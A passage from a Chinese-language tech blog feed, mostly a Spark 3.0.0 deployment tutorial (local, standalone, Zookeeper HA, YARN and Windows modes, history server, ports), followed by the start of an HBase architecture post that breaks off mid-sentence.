class="line-numbers language-scala"><code class="language-scala">sc<span class="token punctuation">.</span>textFile<span class="token punctuation">(</span><span class="token string">"data/word.txt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>flatMap<span class="token punctuation">(</span>_<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>map<span class="token punctuation">(</span><span class="token punctuation">(</span>_<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>reduceByKey<span class="token punctuation">(</span>_<span class="token operator">+</span>_<span class="token punctuation">)</span><span class="token punctuation">.</span>collect<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/29/bigdata-Spark1-setup/1638176440182.png" alt="1638176440182"></p><h3 id="3-1-4-退出本地模式"><a href="#3-1-4-退出本地模式" class="headerlink" title="3.1.4 退出本地模式"></a>3.1.4 退出本地模式</h3><p>按键Ctrl+C或输入Scala指令</p><pre class="line-numbers language-bash"><code class="language-bash">:quit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-1-5-提交应用"><a href="#3-1-5-提交应用" class="headerlink" title="3.1.5 提交应用"></a>3.1.5 提交应用</h3><pre class="line-numbers language-bash"><code class="language-bash">bin/spark-submit \--class org.apache.spark.examples.SparkPi \--master local<span class="token punctuation">[</span>2<span class="token punctuation">]</span> \./examples/jars/spark-examples_2.12-3.0.0.jar \10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>–class表示要执行程序的主类，此处可以更换为咱们自己写的应用程序</li><li>–master local[2] 部署模式，默认为本地模式，数字表示分配的虚拟CPU核数量;不知道可以用*</li><li>spark-examples_2.12-3.0.0.jar 运行的应用类所在的jar包，实际使用时，可以设定为咱们自己打的jar包</li><li>数字10表示程序的入口参数，用于设定当前应用的任务数量</li></ol><h2 id="3-2-Standalone模式"><a href="#3-2-Standalone模式" class="headerlink" title="3.2  Standalone模式"></a>3.2  Standalone模式</h2><p>local本地模式毕竟只是用来进行练习演示的，真实工作中还是要将应用提交到对应的集群中去执行，这里我们来看看只使用<strong>Spark自身节点运行的集群模式</strong>，也就是我们所谓的独立部署（Standalone）模式。Spark的Standalone模式体现了经典的master-slave模式。（<strong>Standalone=spark提供资源+spark提供计算</strong>）</p><p><img src="/2020/11/29/bigdata-Spark1-setup/1638174301463.png" alt="1638174301463"></p><p>集群规划:</p><table><thead><tr><th></th><th>Linux1</th><th>Linux2</th><th>Linux3</th></tr></thead><tbody><tr><td>Spark</td><td>Worker  Master</td><td>Worker</td><td>Worker</td></tr></tbody></table><h3 id="3-2-1-解压缩文件"><a href="#3-2-1-解压缩文件" class="headerlink" title="3.2.1 解压缩文件"></a>3.2.1 解压缩文件</h3><p>将spark-3.0.0-bin-hadoop3.2.tgz文件上传到Linux并解压缩在指定位置</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">tar</span> -zxvf spark-3.0.0-bin-hadoop3.2.tgz -C /opt/module<span class="token function">cd</span> /opt/module <span class="token function">mv</span> spark-3.0.0-bin-hadoop3.2 spark-standalone<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="3-2-2-修改配置文件"><a href="#3-2-2-修改配置文件" class="headerlink" title="3.2.2 修改配置文件"></a>3.2.2 修改配置文件</h3><ol><li>进入解压缩后路径的conf目录，修改slaves.template文件名为slaves</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mv</span> slaves.template slaves 修改slaves文件，添加worker节点<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash">linux1linux2linux3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="2"><li>修改spark-env.sh.template文件名为spark-env.sh</li></ol><pre><code>mv spark-env.sh.template spark-env.sh</code></pre><p> 修改spark-env.sh文件，添加JAVA_HOME环境变量和集群对应的master节点。指定master机器，和集群间spark通信的端口。</p><pre class="line-numbers language-sh"><code class="language-sh">export JAVA_HOME=/opt/module/jdk1.8.0_144SPARK_MASTER_HOST=linux1SPARK_MASTER_PORT=7077<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>注意：7077端口，相当于hadoop3内部通信的8020端口，此处的端口需要确认自己的Hadoop配置</p><ol start="5"><li>分发spark-standalone目录</li></ol><pre class="line-numbers language-bash"><code class="language-bash">xsync spark-standalone<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-2-3-启动集群"><a href="#3-2-3-启动集群" class="headerlink" title="3.2.3 启动集群"></a>3.2.3 启动集群</h3><ol><li>执行脚本命令：</li></ol><pre class="line-numbers language-bash"><code class="language-bash">sbin/start-all.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/29/bigdata-Spark1-setup/1638174700872.png" alt="1638174700872"></p><ol start="2"><li>查看三台服务器运行进程</li></ol><pre class="line-numbers language-bash"><code class="language-bash">xcall jps<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>linux1<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>3330 Jps3238 Worker3163 Master<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>linux2<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>2966 Jps2908 Worker<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>linux3<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>2978 Worker3036 Jps<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li>查看Master资源监控Web UI界面: <a href="http://linux1:8080/">http://linux1:8080</a></li></ol><p><img src="/2020/11/29/bigdata-Spark1-setup/1638174744996.png" alt="1638174744996"></p><h3 id="3-2-4-提交应用"><a href="#3-2-4-提交应用" class="headerlink" title="3.2.4 提交应用"></a>3.2.4 提交应用</h3><pre class="line-numbers language-bash"><code class="language-bash">bin/spark-submit \--class org.apache.spark.examples.SparkPi \--master spark://linux1:7077 \./examples/jars/spark-examples_2.12-3.0.0.jar \10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>–class表示要执行程序的主</li><li>–master spark://linux1:7077 独立部署模式，连接到Spark集群</li><li>spark-examples_2.12-3.0.0.jar 运行类所在的jar包</li><li>数字10表示程序的入口参数，用于设定当前应用的任务数量</li></ol><p>执行任务时，会产生多个Java进程</p><p><img src="/2020/11/29/bigdata-Spark1-setup/1638175491608.png" alt="1638175491608"></p><p>执行任务时，默认采用服务器集群节点的总核数，每个节点内存1024M。</p><p><img src="/2020/11/29/bigdata-Spark1-setup/1638175504305.png" alt="1638175504305"></p><h3 id="3-2-5-提交参数说明"><a href="#3-2-5-提交参数说明" class="headerlink" title="3.2.5 提交参数说明"></a>3.2.5 提交参数说明</h3><p>在提交应用中，一般会同时一些提交参数</p><pre class="line-numbers language-bash"><code class="language-bash">bin/spark-submit \--class <span class="token operator">&lt;</span>main-class<span class="token operator">></span>--master <span class="token operator">&lt;</span>master-url<span class="token operator">></span> \<span class="token punctuation">..</span>. <span class="token comment" spellcheck="true"># other options</span><span class="token operator">&lt;</span>application-jar<span class="token operator">></span> \<span class="token punctuation">[</span>application-arguments<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><table><thead><tr><th>参数</th><th>解释</th><th>可选值举例</th></tr></thead><tbody><tr><td>–class</td><td>Spark程序中包含主函数的类</td><td></td></tr><tr><td>–master</td><td>Spark程序运行的模式(环境)</td><td>*<em>模式：local[</em>]、spark://linux1:7077、  Yarn**</td></tr><tr><td>–executor-memory  1G</td><td>指定每个executor可用内存为1G</td><td>符合集群内存配置即可，具体情况具体分析。</td></tr><tr><td>–total-executor-cores  2</td><td>指定所有executor使用的cpu核数为2个</td><td></td></tr><tr><td>–executor-cores</td><td>指定每个executor使用的cpu核数</td><td></td></tr><tr><td>application-jar</td><td>打包好的应用jar，包含依赖。这个URL在集群中全局可见。 比如hdfs:// 共享存储系统，如果是file://  path，那么所有的节点的path都包含同样的jar</td><td></td></tr><tr><td>application-arguments</td><td>传给main()方法的参数</td><td></td></tr></tbody></table><h3 id="3-2-6-配置历史服务"><a href="#3-2-6-配置历史服务" class="headerlink" title="3.2.6 配置历史服务"></a>3.2.6 配置历史服务</h3><p>由于spark-shell停止掉后，集群监控linux1:4040页面就看不到历史任务的运行情况，所以开发时都配置历史服务器记录任务运行情况。**(历史信息存到了HDFS中)**</p><ol><li>修改spark-defaults.conf.template文件名为spark-defaults.conf</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mv</span> spark-defaults.conf.template spark-defaults.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>修改spark-default.conf文件，配置日志存储路径</li></ol><pre class="line-numbers language-sh"><code class="language-sh">spark.eventLog.enabled     truespark.eventLog.dir        hdfs://linux1:8020/directory<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>注意：需要启动hadoop集群，HDFS上的directory目录需要提前存在。</strong></p><pre class="line-numbers language-bash"><code class="language-bash">sbin/start-dfs.shhadoop fs -mkdir /directory<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="3"><li>修改spark-env.sh文件, 添加日志配置</li></ol><pre class="line-numbers language-sh"><code class="language-sh">export SPARK_HISTORY_OPTS="-Dspark.history.ui.port=18080 -Dspark.history.fs.logDirectory=hdfs://linux1:8020/directory -Dspark.history.retainedApplications=30"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>l 参数1含义：WEB UI访问的端口号为18080<br>l 参数2含义：指定历史服务器日志存储路径<br>l 参数3含义：指定保存Application历史记录的个数，如果超过这个值，旧的应用程序信息将被删除，这个是内存中的应用数，而不是页面上显示的应用数。</p><ol start="4"><li>分发配置文件</li></ol><pre class="line-numbers language-bash"><code class="language-bash">xsync conf <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="5"><li>重新启动集群和历史服务</li></ol><pre><code>sbin/start-all.shsbin/start-history-server.sh</code></pre><ol start="6"><li>重新执行任务</li></ol><pre class="line-numbers language-bash"><code class="language-bash">bin/spark-submit \--class org.apache.spark.examples.SparkPi \--master spark://linux1:7077 \./examples/jars/spark-examples_2.12-3.0.0.jar \10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="7"><li>查看历史服务：<a href="http://linux1:18080/">http://linux1:18080</a></li></ol><p><img src="/2020/11/29/bigdata-Spark1-setup/1638175185282.png" alt="1638175185282"></p><h3 id="3-2-7-配置高可用（HA）"><a href="#3-2-7-配置高可用（HA）" class="headerlink" title="3.2.7 配置高可用（HA）"></a>3.2.7 配置高可用（HA）</h3><p>所谓的高可用是因为当前集群中的Master节点只有一个，所以会存在单点故障问题。<strong>所以为了解决单点故障问题，需要在集群中配置多个Master节点</strong>，一旦处于活动状态的Master发生故障时，由备用Master提供服务，保证作业可以继续执行。这里的高可用一般采用Zookeeper设置。</p><p><strong>集群规划</strong>:</p><table><thead><tr><th></th><th>Linux1</th><th>Linux2</th><th>Linux3</th></tr></thead><tbody><tr><td>Spark</td><td>Master  Zookeeper  Worker</td><td>Master  Zookeeper  Worker</td><td>Zookeeper  Worker</td></tr></tbody></table><ol><li>停止集群</li></ol><pre class="line-numbers language-bash"><code class="language-bash">sbin/stop-all.sh <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>启动Zookeeper</li></ol><pre class="line-numbers language-bash"><code class="language-bash">xstart zk <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>修改spark-env.sh文件添加如下配置</li></ol><p>注释如下内容：</p><p>#SPARK_MASTER_HOST=linux1</p><p>#SPARK_MASTER_PORT=7077</p><p>添加如下内容:</p><p>#Master监控页面默认访问端口为8080，但是可能会和Zookeeper冲突，所以改成8989，也可以自定义，访问UI监控页面时请注意</p><pre class="line-numbers language-sh"><code class="language-sh">SPARK_MASTER_WEBUI_PORT=8989export SPARK_DAEMON_JAVA_OPTS="-Dspark.deploy.recoveryMode=ZOOKEEPER -Dspark.deploy.zookeeper.url=linux1,linux2,linux3 -Dspark.deploy.zookeeper.dir=/spark"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="4"><li>分发配置文件</li></ol><pre class="line-numbers language-bash"><code class="language-bash">xsync conf/ <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="5"><li>启动集群</li></ol><pre class="line-numbers language-bash"><code class="language-bash">sbin/start-all.sh <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/29/bigdata-Spark1-setup/1638175383495.png" alt="1638175383495"></p><ol start="6"><li>启动linux2的单独Master节点，此时linux2节点Master状态处于备用状态</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@linux2 spark-standalone<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># sbin/start-master.sh </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/29/bigdata-Spark1-setup/1638175397500.png" alt="1638175397500"></p><ol start="7"><li>提交应用到高可用集群</li></ol><pre class="line-numbers language-bash"><code class="language-bash">bin/spark-submit \--class org.apache.spark.examples.SparkPi \--master spark://linux1:7077,linux2:7077 \./examples/jars/spark-examples_2.12-3.0.0.jar \10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="8"><li>停止linux1的Master资源监控进程</li></ol><p><img src="/2020/11/29/bigdata-Spark1-setup/1638175436542.png" alt="1638175436542"></p><ol start="9"><li>查看linux2的Master 资源监控Web UI，稍等一段时间后，linux2节点的Master状态提升为活动状态</li></ol><p><img src="/2020/11/29/bigdata-Spark1-setup/1638175451854.png" alt="1638175451854"></p><h2 id="3-3-Yarn模式"><a href="#3-3-Yarn模式" class="headerlink" title="3.3  Yarn模式"></a>3.3  Yarn模式</h2><p>独立部署（Standalone）模式由Spark自身提供计算资源，无需其他框架提供资源。这种方式降低了和其他第三方资源框架的耦合性，独立性非常强。但是你也要记住，Spark主要是计算框架，而不是资源调度框架，所以本身提供的资源调度并不是它的强项，所以还是和其他专业的资源调度框架集成会更靠谱一些。所以接下来我们来学习在强大的Yarn环境下Spark是如何工作的（其实是因为在国内工作中，Yarn使用的非常多）。</p><p><img src="/2020/11/29/bigdata-Spark1-setup/1638175863107.png" alt="1638175863107"></p><h3 id="3-3-1-解压缩文件"><a href="#3-3-1-解压缩文件" class="headerlink" title="3.3.1 解压缩文件"></a>3.3.1 解压缩文件</h3><p>将spark-3.0.0-bin-hadoop3.2.tgz文件上传到linux并解压缩，放置在指定位置。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">tar</span> -zxvf spark-3.0.0-bin-hadoop3.2.tgz -C /opt/module<span class="token function">cd</span> /opt/module <span class="token function">mv</span> spark-3.0.0-bin-hadoop3.2 spark-yarn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="3-3-2-修改配置文件"><a href="#3-3-2-修改配置文件" class="headerlink" title="3.3.2 修改配置文件"></a>3.3.2 修改配置文件</h3><ol><li>修改hadoop配置文件/opt/module/hadoop/etc/hadoop/yarn-site.xml, 并分发</li></ol><pre class="line-numbers language-xml"><code class="language-xml"><span class="token comment" spellcheck="true">&lt;!--是否启动一个线程检查每个任务正使用的物理内存量，如果任务超出分配值，则直接将其杀掉，默认是true --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>yarn.nodemanager.pmem-check-enabled<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--是否启动一个线程检查每个任务正使用的虚拟内存量，如果任务超出分配值，则直接将其杀掉，默认是true --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>yarn.nodemanager.vmem-check-enabled<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>修改conf/spark-env.sh，添加JAVA_HOME和YARN_CONF_DIR配置</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mv</span> spark-env.sh.template spark-env.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查找yarn的位置</p><pre class="line-numbers language-sh"><code class="language-sh">export JAVA_HOME=/opt/module/jdk1.8.0_144YARN_CONF_DIR=/opt/module/hadoop/etc/hadoop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="3-3-3-启动HDFS以及YARN集群"><a href="#3-3-3-启动HDFS以及YARN集群" class="headerlink" title="3.3.3 启动HDFS以及YARN集群"></a>3.3.3 启动HDFS以及YARN集群</h3><p>瞅啥呢，自己启动去！</p><h3 id="3-3-4-提交应用"><a href="#3-3-4-提交应用" class="headerlink" title="3.3.4 提交应用"></a>3.3.4 提交应用</h3><p>master指定为yarn，部署模式为集群模式。</p><pre class="line-numbers language-bash"><code class="language-bash">bin/spark-submit \--class org.apache.spark.examples.SparkPi \--master yarn \--deploy-mode cluster \./examples/jars/spark-examples_2.12-3.0.0.jar \10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/11/29/bigdata-Spark1-setup/1638175901609.png" alt="1638175901609"></p><p><img src="/2020/11/29/bigdata-Spark1-setup/1638175915913.png" alt="1638175915913"></p><p>查看 <a href="http://linux2:8088/">http://linux2:8088</a> 页面，点击History，查看历史页面</p><p><img src="/2020/11/29/bigdata-Spark1-setup/1638175935231.png" alt="1638175935231"></p><h3 id="3-3-5-配置历史服务器"><a href="#3-3-5-配置历史服务器" class="headerlink" title="3.3.5 配置历史服务器"></a>3.3.5 配置历史服务器</h3><ol><li>修改spark-defaults.conf.template文件名为spark-defaults.conf</li></ol><pre><code>mv spark-defaults.conf.template spark-defaults.conf</code></pre><ol start="2"><li>修改spark-default.conf文件，配置日志存储路径</li></ol><pre><code>spark.eventLog.enabled     truespark.eventLog.dir        hdfs://linux1:8020/directory</code></pre><p>注意：需要启动hadoop集群，HDFS上的目录需要提前存在。</p><pre><code>[root@linux1 hadoop]# sbin/start-dfs.sh[root@linux1 hadoop]# hadoop fs -mkdir /directory</code></pre><ol start="3"><li>修改spark-env.sh文件, 添加日志配置</li></ol><pre><code>export SPARK_HISTORY_OPTS=&quot;-Dspark.history.ui.port=18080 -Dspark.history.fs.logDirectory=hdfs://linux1:8020/directory -Dspark.history.retainedApplications=30&quot;</code></pre><p>l 参数1含义：WEB UI访问的端口号为18080</p><p>l 参数2含义：指定历史服务器日志存储路径</p><p>l 参数3含义：指定保存Application历史记录的个数，如果超过这个值，旧的应用程序信息将被删除，这个是内存中的应用数，而不是页面上显示的应用数。</p><ol start="4"><li>修改spark-defaults.conf</li></ol><pre><code>spark.yarn.historyServer.address=linux1:18080spark.history.ui.port=18080</code></pre><ol start="5"><li>启动历史服务</li></ol><pre><code>sbin/start-history-server.sh </code></pre><ol start="6"><li>重新提交应用</li></ol><pre><code>bin/spark-submit \--class org.apache.spark.examples.SparkPi \--master yarn \--deploy-mode client \./examples/jars/spark-examples_2.12-3.0.0.jar \10</code></pre><p><img src="/2020/11/29/bigdata-Spark1-setup/1638176022879.png" alt="1638176022879"></p><p><img src="/2020/11/29/bigdata-Spark1-setup/1638176037995.png" alt="1638176037995"></p><ol start="7"><li>Web页面查看日志：<a href="http://linux2:8088/">http://linux2:8088</a></li></ol><p><img src="/2020/11/29/bigdata-Spark1-setup/1638176059473.png" alt="1638176059473"></p><p><img src="/2020/11/29/bigdata-Spark1-setup/1638176071216.png" alt="1638176071216"></p><h2 id="3-4-K8S-amp-Mesos模式"><a href="#3-4-K8S-amp-Mesos模式" class="headerlink" title="3.4  K8S &amp; Mesos模式"></a>3.4  K8S &amp; Mesos模式</h2><p>Mesos是Apache下的开源分布式资源管理框架，它被称为是分布式系统的内核,在Twitter得到广泛使用,管理着Twitter超过30,0000台服务器上的应用部署，但是在国内，依然使用着传统的Hadoop大数据框架，所以国内使用Mesos框架的并不多，但是原理其实都差不多，这里我们就不做过多讲解了。</p><p><img src="/2020/11/29/bigdata-Spark1-setup/1638176091921.png" alt="1638176091921"></p><p>容器化部署是目前业界很流行的一项技术，基于Docker镜像运行能够让用户更加方便地对应用进行管理和运维。容器管理工具中最为流行的就是Kubernetes（k8s），而Spark也在最近的版本中支持了k8s部署模式。这里我们也不做过多的讲解。给个链接大家自己感受一下：<a href="https://spark.apache.org/docs/latest/running-on-kubernetes.html">https://spark.apache.org/docs/latest/running-on-kubernetes.html</a></p><p><img src="/2020/11/29/bigdata-Spark1-setup/1638176106974.png" alt="1638176106974"></p><h2 id="3-5-Windows模式"><a href="#3-5-Windows模式" class="headerlink" title="3.5  Windows模式"></a>3.5  Windows模式</h2><p>在同学们自己学习时，每次都需要启动虚拟机，启动集群，这是一个比较繁琐的过程，并且会占大量的系统资源，导致系统执行变慢，不仅仅影响学习效果，也影响学习进度，Spark非常暖心地提供了可以在windows系统下启动本地集群的方式，这样，在不使用虚拟机的情况下，也能学习Spark的基本使用！</p><p>在后续的教学中，为了能够给同学们更加流畅的教学效果和教学体验，我们一般情况下都会采用windows系统的集群来学习Spark。</p><h3 id="3-5-1-解压缩文件"><a href="#3-5-1-解压缩文件" class="headerlink" title="3.5.1 解压缩文件"></a>3.5.1 解压缩文件</h3><p>将文件spark-3.0.0-bin-hadoop3.2.tgz解压缩到无中文无空格的路径中</p><h3 id="3-5-2-启动本地环境"><a href="#3-5-2-启动本地环境" class="headerlink" title="3.5.2 启动本地环境"></a>3.5.2 启动本地环境</h3><ol><li>执行解压缩文件路径下bin目录中的spark-shell.cmd文件，启动Spark本地环境</li></ol><p><img src="/2020/11/29/bigdata-Spark1-setup/1638176202265.png" alt="1638176202265"></p><ol start="2"><li>在bin目录中创建input目录，并添加word.txt文件, 在命令行中输入脚本代码</li></ol><p><img src="/2020/11/29/bigdata-Spark1-setup/1638176219502.png" alt="1638176219502"></p><h3 id="3-5-3-命令行提交应用"><a href="#3-5-3-命令行提交应用" class="headerlink" title="3.5.3 命令行提交应用"></a>3.5.3 命令行提交应用</h3><p>在DOS命令行窗口中执行提交指令</p><pre class="line-numbers language-bash"><code class="language-bash">spark-submit --class org.apache.spark.examples.SparkPi --master local<span class="token punctuation">[</span>2<span class="token punctuation">]</span> <span class="token punctuation">..</span>/examples/jars/spark-examples_2.12-3.0.0.jar 10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-6-部署模式对比"><a href="#3-6-部署模式对比" class="headerlink" title="3.6  部署模式对比"></a>3.6  部署模式对比</h2><table><thead><tr><th>模式</th><th>Spark安装机器数</th><th>需启动的进程</th><th>所属者</th><th>应用场景</th></tr></thead><tbody><tr><td>Local</td><td>1</td><td>无</td><td>Spark</td><td>测试</td></tr><tr><td>Standalone</td><td>3</td><td>Master及Worker</td><td>Spark</td><td>单独部署</td></tr><tr><td>Yarn</td><td>1</td><td>Yarn及HDFS</td><td>Hadoop</td><td>混合部署</td></tr></tbody></table><h2 id="3-7-端口号"><a href="#3-7-端口号" class="headerlink" title="3.7  端口号"></a>3.7  端口号</h2><ul><li><p>Spark查看当前Spark-shell运行任务情况端口号：4040（计算）</p></li><li><p>Spark Master内部通信服务端口号：7077</p></li><li><p>Standalone模式下，Spark Master Web端口号：8080（资源）</p></li><li><p>Spark历史服务器端口号：18080</p></li><li><p>Hadoop YARN任务运行情况查看端口号：8088</p></li></ul>]]></content:encoded>
      
      
      <category domain="https://m01ly.github.io/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BC%80%E5%8F%91/">大数据开发</category>
      
      
      <category domain="https://m01ly.github.io/tags/Spark/">Spark</category>
      
      
      <comments>https://m01ly.github.io/2020/11/29/bigdata-Spark1-setup/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>HBase学习笔记（二） HBase架构解析</title>
      <link>https://m01ly.github.io/2020/11/25/bigdata-HBase2-framework/</link>
      <guid>https://m01ly.github.io/2020/11/25/bigdata-HBase2-framework/</guid>
      <pubDate>Wed, 25 Nov 2020 03:46:51 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1-HBase架构解析"><a href="#1-HBase架构解析" class="headerlink" title="1 HBase架构解析"></a>1 HBase架构解析</h1><h2 id="1-1-RegionServer-架构"><a href="#1-1-RegionServer-架构" class="headerlink" title="1.1 RegionServer 架构"></a>1.1 RegionServer 架构</h2><p> <img src="/2020/11/25/bigdata-HBase2-framework/1637810890299.png" alt="1637810890299"></p><p><strong>1）StoreFile</strong></p><p>保存实际数据的物理文件，<strong>StoreFile以Hfile的形式存储在HDFS上</strong>。每个Store会有一个或多个StoreFile（HFile），数据在每个StoreFile中都是有序的。</p><p><strong>2）MemStore</strong></p><p><strong>写缓存</strong>，由于HFile中的数据要求是有序的，所以<strong>数据是先存储在MemStore中，排好序后，等到达刷写时机才会刷写到HFile</strong>，每次刷写都会形成一个新的HFile。</p><p><strong>3）WAL</strong></p><p>由于数据要经MemStore排序后才能刷写到HFile，<strong>但把数据保存在内存中会有很高的概率导致数据丢失</strong>，为了解决这个问题，<strong>数据会先写在一个叫做Write-Ahead logfile的文件中</strong>，然后再写入MemStore中。所以在系统出现故障的时候，数据可以通过这个日志文件重建。</p><p><strong>4）BlockCache</strong></p><p><strong>读缓存</strong>，每次查询出的数据会缓存在BlockCache中，方便下次查询（LRU机制清理）。</p><h2 id="1-2-写流程"><a href="#1-2-写流程" class="headerlink" title="1.2 写流程"></a>1.2 写流程</h2><p>  <img src="/2020/11/25/bigdata-HBase2-framework/1637810932896.png" alt="1637810932896"></p><p>写流程：</p><p>1）Client先访问<strong>zookeeper</strong>，获取<strong>hbase:meta</strong>（存储业务表的元数据）表位于哪个Region Server。可以看到<strong>hbase:meta</strong>表存在hadoop104中。</p><p><img src="/2020/11/25/bigdata-HBase2-framework/1637825177104.png" alt="1637825177104"></p><p>2）访问对应的Region Server，获取hbase:meta表，根据读请求的namespace:table/rowkey，查询出目标数据位于哪个Region Server中的哪个Region中。并将该table的region信息以及meta表的位置信息缓存在客户端的meta cache，方便下次访问。途中发现：该表是存储在hadoop103的（scan ‘student’）。</p><p><img src="/2020/11/25/bigdata-HBase2-framework/1637825241657.png" alt="1637825241657"></p><p>3）与目标Region Server进行通讯；</p><p>4）将数据顺序写入（追加）到WAL；</p><p>5）将数据写入对应的MemStore，数据会在MemStore进行排序；</p><p>6）向客户端发送ack；</p><p>7）等达到MemStore的刷写时机后，将数据刷写到HFile。</p><h2 id="1-3-MemStore-Flush"><a href="#1-3-MemStore-Flush" class="headerlink" title="1.3 MemStore Flush"></a>1.3 MemStore Flush</h2><p>  <img src="/2020/11/25/bigdata-HBase2-framework/1637810958068.png" alt="1637810958068"></p><p><strong>MemStore刷写时机：</strong></p><p>0）手动刷写 ：刷写’stu’表</p><pre class="line-numbers language-bash"><code class="language-bash">flush <span class="token string">'stu'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>1）当某个memstore的大小达到了<strong>hbase.hregion.memstore.flush.size（默认值128M）</strong>，其<strong>所在region的所有memstore都会刷写</strong>。</p><p>当memstore的大小达到了</p><pre class="line-numbers language-bash"><code class="language-bash">hbase.hregion.memstore.flush.size（默认值128M）* 